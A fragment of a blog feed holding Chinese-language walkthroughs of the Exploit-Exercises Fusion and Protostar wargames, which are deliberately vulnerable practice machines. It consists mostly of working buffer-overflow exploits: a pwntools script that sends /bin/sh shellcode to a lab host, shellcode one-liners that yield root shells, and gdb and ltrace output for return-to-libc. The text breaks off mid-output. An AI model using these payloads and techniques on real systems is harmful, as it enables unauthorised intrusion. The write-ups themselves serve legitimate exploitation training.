id="Level-33-→-Level-34"><a href="#Level-33-→-Level-34" class="headerlink" title="Level 33 → Level 34"></a>Level 33 → Level 34</h1>]]></content>
      
      <categories>
          
          <category> WARGAME </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Exploit-Exercise_Fusion全攻略+解析</title>
      <link href="/Exploit-Exercise-Fusion%E5%85%A8%E6%94%BB%E7%95%A5-%E8%A7%A3%E6%9E%90/"/>
      <url>/Exploit-Exercise-Fusion%E5%85%A8%E6%94%BB%E7%95%A5-%E8%A7%A3%E6%9E%90/</url>
      <content type="html"><![CDATA[<p>目前进度：</p><ul><li style="list-style: none"><input type="checkbox" checked> Level 00</li><li style="list-style: none"><input type="checkbox"> Level 01</li><li style="list-style: none"><input type="checkbox"> Level 02</li><li style="list-style: none"><input type="checkbox"> Level 03</li><li style="list-style: none"><input type="checkbox"> Level 04</li><li style="list-style: none"><input type="checkbox"> Level 05</li><li style="list-style: none"><input type="checkbox"> Level 06</li><li style="list-style: none"><input type="checkbox"> Level 07</li><li style="list-style: none"><input type="checkbox"> Level 08</li><li style="list-style: none"><input type="checkbox"> Level 09</li><li style="list-style: none"><input type="checkbox"> Level 10</li><li style="list-style: none"><input type="checkbox"> Level 11</li><li style="list-style: none"><input type="checkbox"> Level 12</li><li style="list-style: none"><input type="checkbox"> Level 13</li><li style="list-style: none"><input type="checkbox"> Level 14</li></ul><a id="more"></a><h1 id="Level-00"><a href="#Level-00" class="headerlink" title="Level 00"></a>Level 00</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'</span></span><br><span class="line">prefix=<span class="string">'GET '</span></span><br><span class="line">postfix=<span class="string">' HTTP/1.1'</span> </span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">'192.168.116.150'</span>, <span class="number">20000</span>)</span><br><span class="line">r.recvuntil(<span class="string">'er is at'</span>)</span><br><span class="line">addr=int(r.recv()[<span class="number">0</span>:<span class="number">11</span>],<span class="number">16</span>)</span><br><span class="line"><span class="comment">#print addr,hex(addr)</span></span><br><span class="line"><span class="keyword">print</span> hex(addr+<span class="number">200</span>)</span><br><span class="line">r.sendline(prefix+<span class="string">'G'</span>*<span class="number">139</span>+p32(addr+<span class="number">200</span>)+postfix+<span class="string">'\x90'</span>*<span class="number">100</span>+shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/Fusion<span class="comment"># ./level00.py </span></span><br><span class="line">[+] Opening connection to 192.168.116.150 on port 20000: Done</span><br><span class="line">0xbffff9c0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=20000 gid=20000 groups=20000</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> WARGAME </tag>
            
            <tag> stackoverflow </tag>
            
            <tag> mitigation </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Exploit-Exercise_Protostar全攻略+解析</title>
      <link href="/Exploit-Exercise-Protostar%E5%85%A8%E6%94%BB%E7%95%A5-%E8%A7%A3%E6%9E%90/"/>
      <url>/Exploit-Exercise-Protostar%E5%85%A8%E6%94%BB%E7%95%A5-%E8%A7%A3%E6%9E%90/</url>
      <content type="html"><![CDATA[<p>目前进度：</p><ul><li style="list-style: none"><input type="checkbox" checked> Stack 0</li><li style="list-style: none"><input type="checkbox" checked> Stack 1</li><li style="list-style: none"><input type="checkbox" checked> Stack 2</li><li style="list-style: none"><input type="checkbox" checked> Stack 3</li><li style="list-style: none"><input type="checkbox"> 小结一：C/C++程序中的栈</li><li style="list-style: none"><input type="checkbox" checked> Stack 4</li><li style="list-style: none"><input type="checkbox"> 小结二：EIP能好怎</li><li style="list-style: none"><input type="checkbox" checked> Stack 5</li><li style="list-style: none"><input type="checkbox"> 小结三：shellcode</li><li style="list-style: none"><input type="checkbox" checked> Stack 6</li><li style="list-style: none"><input type="checkbox" checked> Stack 7</li><li style="list-style: none"><input type="checkbox" checked> Format 0</li><li style="list-style: none"><input type="checkbox" checked> Format 1</li><li style="list-style: none"><input type="checkbox" checked> Format 2</li><li style="list-style: none"><input type="checkbox" checked> Format 3</li><li style="list-style: none"><input type="checkbox" checked> Format 4</li><li style="list-style: none"><input type="checkbox"> 小结四：格式化字符串</li><li style="list-style: none"><input type="checkbox" checked> Heap 0</li><li style="list-style: none"><input type="checkbox" checked> Heap 1</li><li style="list-style: none"><input type="checkbox" checked> Heap 2</li><li style="list-style: none"><input type="checkbox" checked> Heap 3</li><li style="list-style: none"><input type="checkbox" checked> Net 0</li><li style="list-style: none"><input type="checkbox" checked> Net 1</li><li style="list-style: none"><input type="checkbox" checked> Net 2</li><li style="list-style: none"><input type="checkbox" checked> Final 0</li><li style="list-style: none"><input type="checkbox" checked> Final 1</li><li style="list-style: none"><input type="checkbox" checked> Final 2</li></ul><a id="more"></a><h1 id="Stack-0"><a href="#Stack-0" class="headerlink" title="Stack 0"></a>Stack 0</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'a'*65"</span> | ./stack0</span><br><span class="line">you have changed the <span class="string">'modified'</span> variable</span><br></pre></td></tr></table></figure><h1 id="Stack-1"><a href="#Stack-1" class="headerlink" title="Stack 1"></a>Stack 1</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'a'*64+'dcba'"</span> | xargs ./stack1</span><br><span class="line">you have correctly got the variable to the right value</span><br></pre></td></tr></table></figure><h1 id="Stack-2"><a href="#Stack-2" class="headerlink" title="Stack 2"></a>Stack 2</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GREENIE=`python -c <span class="string">"print 'a'*64+'\x0a\x0d\x0a\x0d'"</span>` ./stack2</span><br></pre></td></tr></table></figure><h1 id="Stack-3"><a href="#Stack-3" class="headerlink" title="Stack 3"></a>Stack 3</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas win</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> win:</span><br><span class="line">0x08048424 &lt;win+0&gt;:     push   %ebp</span><br><span class="line">0x08048425 &lt;win+1&gt;:     mov    %esp,%ebp</span><br><span class="line">0x08048427 &lt;win+3&gt;:     sub    <span class="variable">$0x18</span>,%esp</span><br><span class="line">0x0804842a &lt;win+6&gt;:     movl   <span class="variable">$0x8048540</span>,(%esp)</span><br><span class="line">0x08048431 &lt;win+13&gt;:    call   0x8048360 &lt;puts@plt&gt;</span><br><span class="line">0x08048436 &lt;win+18&gt;:    leave</span><br><span class="line">0x08048437 &lt;win+19&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'a'*64+'\x23\x84\x04\x08'"</span> | ./stack3</span><br><span class="line">calling <span class="keyword">function</span> pointer, jumping to 0x08048423</span><br><span class="line">code flow successfully changed</span><br></pre></td></tr></table></figure><h1 id="Stack-4"><a href="#Stack-4" class="headerlink" title="Stack 4"></a>Stack 4</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">0x08048408 &lt;main+0&gt;:    push   %ebp</span><br><span class="line">0x08048409 &lt;main+1&gt;:    mov    %esp,%ebp</span><br><span class="line">0x0804840b &lt;main+3&gt;:    and    <span class="variable">$0xfffffff0</span>,%esp</span><br><span class="line">0x0804840e &lt;main+6&gt;:    sub    <span class="variable">$0x50</span>,%esp</span><br><span class="line">0x08048411 &lt;main+9&gt;:    lea    0x10(%esp),%eax</span><br><span class="line">0x08048415 &lt;main+13&gt;:   mov    %eax,(%esp)</span><br><span class="line">0x08048418 &lt;main+16&gt;:   call   0x804830c &lt;gets@plt&gt;</span><br><span class="line">0x0804841d &lt;main+21&gt;:   leave</span><br><span class="line">0x0804841e &lt;main+22&gt;:   ret</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disas win</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> win:</span><br><span class="line">0x080483f4 &lt;win+0&gt;:     push   %ebp</span><br><span class="line">0x080483f5 &lt;win+1&gt;:     mov    %esp,%ebp</span><br><span class="line">0x080483f7 &lt;win+3&gt;:     sub    <span class="variable">$0x18</span>,%esp</span><br><span class="line">0x080483fa &lt;win+6&gt;:     movl   <span class="variable">$0x80484e0</span>,(%esp)</span><br><span class="line">0x08048401 &lt;win+13&gt;:    call   0x804832c &lt;puts@plt&gt;</span><br><span class="line">0x08048406 &lt;win+18&gt;:    leave</span><br><span class="line">0x08048407 &lt;win+19&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"s='a'*64\nfor i in range(0, 26):\n  s += chr(ord('a')+i)\nprint s"</span> | python</span><br><span class="line"><span class="comment">### run with this pattern input</span></span><br><span class="line">(gdb) r &lt; ~/stack4.txt</span><br><span class="line">Starting program: /opt/protostar/bin/stack4 &lt; ~/stack4.txt</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x706f6e6d <span class="keyword">in</span> ?? ()<span class="comment">#That's what we need</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line">$ python -c <span class="string">"print 'a'*0x4c+'\xf4\x83\x04\x08'"</span> | ./stack4</span><br><span class="line">code flow successfully changed</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><h1 id="Stack-5"><a href="#Stack-5" class="headerlink" title="Stack 5"></a>Stack 5</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ (python -c <span class="string">"print  '\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80'+ (76-37)*'a'+'\xa0\xfc\xff\xbf'"</span>; cat) | ./stack5</span><br><span class="line">id</span><br><span class="line">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(python -c <span class="string">"print '\x89\xe5\xdb\xd2\xd9\x75\xf4\x59\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x41\x41'+(76-68)*'a'+'\xa0\xfc\xff\xbf'"</span>; cat) | ./stack5</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ (python -c <span class="string">"print '\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'+(76-29)*'\xcc'+'\xa0\xfc\xff\xbf'"</span>; cat) | ./stack5</span><br><span class="line">id</span><br><span class="line">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ (python -c <span class="string">'print "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + "\xcc"*(76-34) + "\xa0\xfc\xff\xbf"'</span>; cat) | ./stack5</span><br><span class="line">Owned!!!</span><br></pre></td></tr></table></figure><h1 id="Stack-6"><a href="#Stack-6" class="headerlink" title="Stack 6"></a>Stack 6</h1><h2 id="solution-1-Duplicated-Shellcode"><a href="#solution-1-Duplicated-Shellcode" class="headerlink" title="solution 1: Duplicated Shellcode"></a>solution 1: Duplicated Shellcode</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'b'*80"</span> |./stack6</span><br><span class="line">input path please: got path bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class="line">input path please: got path bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb ▒</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p>这时在dump出来的文件里可以发现输入的东西在别处出现了</p><img src="/Exploit-Exercise-Protostar全攻略-解析/1532445422307.png" title="Duplicated Shellcode"><img src="/Exploit-Exercise-Protostar全攻略-解析/1532445627447.png" title="Duplicated Shellcode2"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ (python -c <span class="string">"print  '\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80'+ (80-37)*'a'+'\x00\xe0\xfd\xb7'"</span>; cat) | ./stack6</span><br><span class="line">input path please: got path 1▒▒▒RRRT[S_▒/bin▒G//sh@u▒;1ɰ</span><br><span class="line">                                                        ̀aaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">id</span><br><span class="line">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ (python -c <span class="string">"print '\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'+(80-29)*'\xcc'+'\x00\xe0\xfd\xb7'"</span>; cat) | ./stack6</span><br><span class="line">input path please: got path ▒/sh▒%▒▒▒P▒/binP▒▒1▒</span><br><span class="line">                                                1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span><br><span class="line">id</span><br><span class="line">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span><br></pre></td></tr></table></figure><h3 id="寻根究底"><a href="#寻根究底" class="headerlink" title="寻根究底"></a>寻根究底</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'b'*80"</span> |ltrace -S ./stack6 | grep b7fd</span><br><span class="line">SYS_brk(NULL)                                         = 0x0804a000</span><br><span class="line">SYS_fcntl64(0, 1, 0, 0, 0xb7ffeff4)                   = 0</span><br><span class="line">SYS_fcntl64(1, 1, 0, 1, 0xb7ffeff4)                   = 0</span><br><span class="line">SYS_fcntl64(2, 1, 0, 2, 0xb7ffeff4)                   = 0</span><br><span class="line">SYS_access(<span class="string">"/etc/suid-debug"</span>, 00)                     = -2</span><br><span class="line">SYS_access(<span class="string">"/etc/ld.so.nohwcap"</span>, 00)                  = -2</span><br><span class="line">SYS_mmap2(0, 8192, 3, 34, -1)                         = 0xb7fe0000</span><br><span class="line">SYS_access(<span class="string">"/etc/ld.so.preload"</span>, 04)                  = -2</span><br><span class="line">SYS_open(<span class="string">"/etc/ld.so.cache"</span>, 0, 00)                   = 3</span><br><span class="line">SYS_fstat64(3, 0xbffff6d4, 0xb7ffeff4, 0xb7fff87c, 3) = 0</span><br><span class="line">SYS_mmap2(0, 13796, 1, 2, 3)                          = 0xb7fdc000</span><br><span class="line">SYS_close(3)                                          = 0</span><br><span class="line">SYS_access(<span class="string">"/etc/ld.so.nohwcap"</span>, 00)                  = -2</span><br><span class="line">SYS_open(<span class="string">"/lib/libc.so.6"</span>, 0, 00)                     = 3</span><br><span class="line">SYS_read(3, <span class="string">"\177ELF\001\001\001"</span>, 512)               = 512</span><br><span class="line">SYS_fstat64(3, 0xbffff720, 0xb7ffeff4, 0xb7fdf21d, 0x8048268) = 0</span><br><span class="line">SYS_mmap2(0, 0x144948, 5, 2050, 3)                    = 0xb7e97000</span><br><span class="line">SYS_mprotect(0xb7fd5000, 4096, 0)                     = 0</span><br><span class="line">SYS_mmap2(0xb7fd6000, 12288, 3, 2066, 3)              = 0xb7fd6000</span><br><span class="line">SYS_mmap2(0xb7fd9000, 10568, 3, 50, -1)               = 0xb7fd9000</span><br><span class="line">SYS_close(3)                                          = 0</span><br><span class="line">SYS_mmap2(0, 4096, 3, 34, -1)                         = 0xb7e96000</span><br><span class="line">SYS_set_thread_area(0xbffffbc0, 0xb7ffeff4, 0xb7e966c0, 1, 0) = 0</span><br><span class="line">SYS_mprotect(0xb7fd6000, 8192, 1)                     = 0</span><br><span class="line">SYS_mprotect(0xb7ffe000, 4096, 1)                     = 0</span><br><span class="line">SYS_munmap(0xb7fdc000, 13796)                         = 0</span><br><span class="line">__libc_start_main(0x80484fa, 1, 0xbffffd94, 0x8048520, 0x8048510 &lt;unfinished ...&gt;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input path please: "</span> &lt;unfinished ...&gt;</span><br><span class="line">SYS_fstat64(1, 0xbffff604, 0xb7fd7ff4, 0xb7fd84c0, 0x80485d0) = 0</span><br><span class="line">SYS_mmap2(0, 4096, 3, 34, -1)                         = 0xb7fdf000</span><br><span class="line">&lt;... <span class="built_in">printf</span> resumed&gt; )                                = 19</span><br><span class="line">fflush(0xb7fd84c0 &lt;unfinished ...&gt;</span><br><span class="line">SYS_write(1, <span class="string">"input path please: "</span>, 19)               = 19</span><br><span class="line">&lt;... fflush resumed&gt; )                                = 0</span><br><span class="line">gets(0xbffffc8c, 0, 0xb7fe1b28, 1, 0 &lt;unfinished ...&gt;</span><br><span class="line">SYS_fstat64(0, 0xbffffb5c, 0xb7fd7ff4, 0xb7fd8420, 0xb7fd8420) = 0</span><br><span class="line">SYS_mmap2(0, 4096, 3, 34, -1)                         = 0xb7fde000</span><br><span class="line">SYS_read(0, <span class="string">"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"</span>..., 4096) = 81</span><br><span class="line">&lt;... gets resumed&gt; )                                  = 0xbffffc8c</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"got path %s\n"</span>, <span class="string">"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"</span>...) = 74</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input path please: "</span>)                         = 19</span><br><span class="line">fflush(0xb7fd84c0 &lt;unfinished ...&gt;</span><br><span class="line">SYS_write(1, <span class="string">"got path bbbbbbbbbbbbbbbbbbbbbbb"</span>..., 93) = 93</span><br><span class="line">&lt;... fflush resumed&gt; )                                = 0</span><br><span class="line">gets(0xbffffc8c, 0xbffffc8c, 0xb7fe1b28, 1, 0 &lt;unfinished ...&gt;</span><br><span class="line">SYS_read(0, <span class="string">""</span>, 4096)                                 = 0</span><br><span class="line">&lt;... gets resumed&gt; )                                  = 0</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"got path %s\n"</span>, <span class="string">"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"</span>...) = 98</span><br><span class="line">--- SIGSEGV (Segmentation fault) ---</span><br><span class="line">+++ killed by SIGSEGV +++</span><br></pre></td></tr></table></figure><h2 id="solution-2-Return-to-text"><a href="#solution-2-Return-to-text" class="headerlink" title="solution 2: Return to .text"></a>solution 2: Return to .text</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ (python -c <span class="string">"print '\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'+(80-29)*'\xcc'+'\xf9\x84\x04\x08'+'\x7c\xfc\xff\xbf'"</span>; cat) | ./stack6</span><br><span class="line">input path please: got path ▒/sh▒%▒▒▒P▒/binP▒▒1▒</span><br><span class="line">                                                1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span><br><span class="line">id</span><br><span class="line">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span><br></pre></td></tr></table></figure><p>后来发现这个payload是不能复用的，猜测是因为栈地址会变化的原因</p><h2 id="solution-3-Return-to-libc"><a href="#solution-3-Return-to-libc" class="headerlink" title="solution 3: Return to libc"></a>solution 3: Return to libc</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">0x080484fa &lt;main+0&gt;:    push   %ebp</span><br><span class="line">0x080484fb &lt;main+1&gt;:    mov    %esp,%ebp</span><br><span class="line">0x080484fd &lt;main+3&gt;:    and    <span class="variable">$0xfffffff0</span>,%esp</span><br><span class="line">0x08048500 &lt;main+6&gt;:    call   0x8048484 &lt;getpath&gt;</span><br><span class="line">0x08048505 &lt;main+11&gt;:   mov    %ebp,%esp</span><br><span class="line">0x08048507 &lt;main+13&gt;:   pop    %ebp</span><br><span class="line">0x08048508 &lt;main+14&gt;:   ret</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) b *0x80484fd</span><br><span class="line">Breakpoint 1 at 0x80484fd: file stack6/stack6.c, line 26.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /opt/protostar/bin/stack6</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080484fd <span class="keyword">in</span> main (argc=1, argv=0xbffffd54) at stack6/stack6.c:26</span><br><span class="line">26      stack6/stack6.c: No such file or directory.</span><br><span class="line">        <span class="keyword">in</span> stack6/stack6.c</span><br><span class="line">(gdb) p system</span><br><span class="line"><span class="variable">$2</span> = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7ecffb0 &lt;__libc_system&gt;</span><br><span class="line">(gdb) p <span class="built_in">exit</span></span><br><span class="line"><span class="variable">$3</span> = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7ec60c0 &lt;*__GI_exit&gt;</span><br><span class="line"></span><br><span class="line">(gdb) info proc map</span><br><span class="line">process 16347</span><br><span class="line">cmdline = <span class="string">'/opt/protostar/bin/stack6'</span></span><br><span class="line">cwd = <span class="string">'/opt/protostar/bin'</span></span><br><span class="line">exe = <span class="string">'/opt/protostar/bin/stack6'</span></span><br><span class="line">Mapped address spaces:</span><br><span class="line"></span><br><span class="line">        Start Addr   End Addr       Size     Offset objfile</span><br><span class="line">         0x8048000  0x8049000     0x1000          0       /opt/protostar/bin/stack6</span><br><span class="line">         0x8049000  0x804a000     0x1000          0       /opt/protostar/bin/stack6</span><br><span class="line">        0xb7e96000 0xb7e97000     0x1000          0</span><br><span class="line">        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so</span><br><span class="line">        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so</span><br><span class="line">        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so</span><br><span class="line">        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so</span><br><span class="line">        0xb7fd9000 0xb7fdc000     0x3000          0</span><br><span class="line">        0xb7fde000 0xb7fe2000     0x4000          0</span><br><span class="line">        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]</span><br><span class="line">        0xb7fe3000 0xb7ffe000    0x1b000          0         